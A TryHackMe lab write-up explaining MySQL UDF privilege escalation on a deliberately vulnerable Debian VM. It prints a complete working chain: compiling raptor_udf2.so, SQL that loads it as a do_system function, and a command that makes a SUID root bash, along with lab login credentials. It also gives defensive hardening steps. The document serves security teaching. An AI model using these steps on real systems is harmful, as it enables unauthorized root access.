# TryHackMe: Linux Privilege Escalation - Complete Write-up

## 🎯 Room Overview

**Room:** [Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)  
**Difficulty:** Medium  
**Time:** 75 minutes  
**Focus:** Linux Privilege Escalation Techniques

### Description
This room provides hands-on practice with various Linux privilege escalation techniques on an intentionally misconfigured Debian VM. Multiple paths to root access are available, making it an excellent learning environment for understanding different exploitation vectors.

**Credits:** VM created by Sagi Shahar, updated by Tib3rius for his "Linux Privilege Escalation for OSCP and Beyond!" course.

---

## 🔧 Initial Setup & Reconnaissance

### Task 1: Deploying the Vulnerable VM

#### Connection Details
- **Protocol:** SSH (Port 22)
- **Credentials:** `user:password321`
- **Target IP:** `MACHINE_IP`

#### SSH Connection

```bash
ssh user@MACHINE_IP
```

**Note:** If you encounter the error about deprecated ssh-rsa, use:
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa user@MACHINE_IP
```

This error occurs because modern OpenSSH versions have deprecated the ssh-rsa algorithm for security reasons.

#### Initial Enumeration

After logging in, run the `id` command to understand your current privileges:

```bash
id
```

### Output:
![Room Banner](img2.png)

### What This Tells Us:
- **UID 1000:** Regular user account (non-privileged)
- **Primary Group:** user (GID 1000)
- **Secondary Groups:** Multiple group memberships that might be useful for privilege escalation
- **Goal:** Escalate from UID 1000 to UID 0 (root)

---

## 🚀 Task 2: Service Exploits - MySQL UDF Privilege Escalation

### Vulnerability Overview

**Service:** MySQL  
**Issue:** Running as root with no password authentication  
**Attack Vector:** User Defined Functions (UDF) exploitation

### Understanding the Vulnerability

MySQL allows users to create custom functions through User Defined Functions (UDFs). When MySQL runs as root and we have access to create UDFs, we can execute arbitrary system commands with root privileges.

#### Why This Works:
1. MySQL service is running with root privileges
2. No password set for MySQL root user
3. We can compile and load malicious shared objects
4. MySQL's `do_system()` function executes commands as the MySQL process owner (root)

---

### Exploitation Steps

#### Step 1: Navigate to Exploit Directory

```bash
cd /home/user/tools/mysql-udf
```

This directory contains the `raptor_udf2.c` exploit code.

---

#### Step 2: Compile the Exploit

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

**Compilation Breakdown:**

**First Command:**
- `gcc`: GNU C Compiler
- `-g`: Include debugging information
- `-c`: Compile without linking
- `-fPIC`: Generate Position Independent Code (required for shared libraries)
- Creates `raptor_udf2.o` object file

**Second Command:**
- `-shared`: Create a shared library (.so file)
- `-Wl,-soname,raptor_udf2.so`: Pass linker options for shared object name
- `-o raptor_udf2.so`: Output filename
- `-lc`: Link against the C standard library

**Result:** `raptor_udf2.so` - A malicious shared library that MySQL can load

---

#### Step 3: Connect to MySQL

```bash
mysql -u root
```

Since no password is set, we gain immediate access to the MySQL shell with root-level database privileges.

---

#### Step 4: Create Malicious UDF

Execute the following SQL commands in the MySQL shell:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

**Command Explanation:**

1. **`use mysql;`**  
   Switch to the mysql database (required for system-level operations)

2. **`create table foo(line blob);`**  
   Create a temporary table with a BLOB column to hold binary data

3. **`insert into foo values(load_file('...'));`**  
   Load our compiled exploit file into the database table

4. **`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`**  
   Export the binary data to MySQL's plugin directory  
   This is where MySQL looks for loadable UDF libraries

5. **`create function do_system returns integer soname 'raptor_udf2.so';`**  
   Register our malicious function as a UDF  
   Now we can execute system commands through MySQL

---

#### Step 5: Execute Commands as Root

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

**What This Does:**
- **`cp /bin/bash /tmp/rootbash`**: Creates a copy of bash in /tmp
- **`chmod +xs /tmp/rootbash`**: 
  - `+s`: Sets the SUID bit (runs with owner's privileges)
  - `+x`: Makes it executable
  - Since MySQL runs as root, this file is now owned by root with SUID

---

#### Step 6: Exit MySQL and Spawn Root Shell

```bash
exit  # or \q
/tmp/rootbash -p
```

**Important:** The `-p` flag preserves the SUID privileges when executing bash.

**Verify Root Access:**
```bash
id
whoami
```

Expected output:
```
uid=1000(user) euid=0(root) ...
root
```

---

### Cleanup

**Always clean up after exploitation:**

```bash
rm /tmp/rootbash
exit
```

This removes the SUID binary and returns you to the regular user session for the next privilege escalation technique.

---

## 🧠 Key Concepts & Learning Points

### 1. **Service Misconfiguration**
   - Services running as root are high-value targets
   - Default/weak credentials multiply the risk
   - Principle of Least Privilege: Services should run with minimal necessary permissions

### 2. **User Defined Functions (UDFs)**
   - Legitimate feature for extending database functionality
   - Becomes dangerous when database has excessive privileges
   - Similar vulnerabilities exist in PostgreSQL, MSSQL, etc.

### 3. **SUID Binaries**
   - SUID bit allows a program to run with the owner's privileges
   - When set on root-owned files, provides instant privilege escalation
   - Check with: `find / -perm -4000 -type f 2>/dev/null`

### 4. **Shared Libraries in Linux**
   - `.so` files are Linux equivalent of Windows DLLs
   - Applications can load and execute code from shared libraries
   - Position Independent Code (PIC) allows loading at any memory address

### 5. **Compilation Flags Explained**
   - `-fPIC`: Required for shared libraries (enables address randomization)
   - `-shared`: Creates a shared object instead of executable
   - `-Wl`: Pass options directly to the linker

---

## 🛡️ Defensive Measures

### How to Prevent This Attack:

1. **Never run MySQL as root**
   ```bash
   # Run MySQL as dedicated mysql user
   User=mysql
   ```

2. **Set strong passwords**
   ```sql
   ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword123!';
   ```

3. **Disable file operations**
   ```ini
   # In my.cnf
   local-infile=0
   secure-file-priv="/var/lib/mysql-files/"
   ```

4. **Remove unnecessary privileges**
   ```sql
   REVOKE FILE ON *.* FROM 'user'@'localhost';
   ```

5. **Regular security audits**
   ```bash
   # Check running services as root
   ps aux | grep root
   
   # Check for services without passwords
   mysql -u root
   ```

---

## 📚 Additional Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

---

## 🎓 Conclusion

This task demonstrated how a simple service misconfiguration (MySQL running as root with no password) can lead to complete system compromise. The exploitation chain involved:

1. Reconnaissance (identifying vulnerable service)
2. Exploitation (compiling and injecting malicious UDF)
3. Privilege Escalation (creating SUID binary)
4. Cleanup (removing artifacts)

Understanding these techniques is crucial for both penetration testing and defending Linux systems. Always remember: **privilege escalation is often the result of multiple small misconfigurations rather than a single critical vulnerability.**

---

## ✅ Checklist for This Task

- [ ] Successfully SSH into the target VM
- [ ] Ran `id` command to verify current privileges
- [ ] Navigated to mysql-udf directory
- [ ] Compiled the exploit successfully
- [ ] Connected to MySQL as root
- [ ] Created and loaded malicious UDF
- [ ] Executed commands to create SUID bash
- [ ] Spawned root shell with `-p` flag
- [ ] Verified root access
- [ ] Cleaned up artifacts (removed /tmp/rootbash)
- [ ] Returned to regular user session

---

**Next Task:** Continue exploring other privilege escalation techniques in the remaining room tasks.

**Remember:** Exit the root shell and re-establish a session as the "user" account before starting the next technique!

---

*Write-up created for educational purposes. Always obtain proper authorization before testing on systems you don't own.*
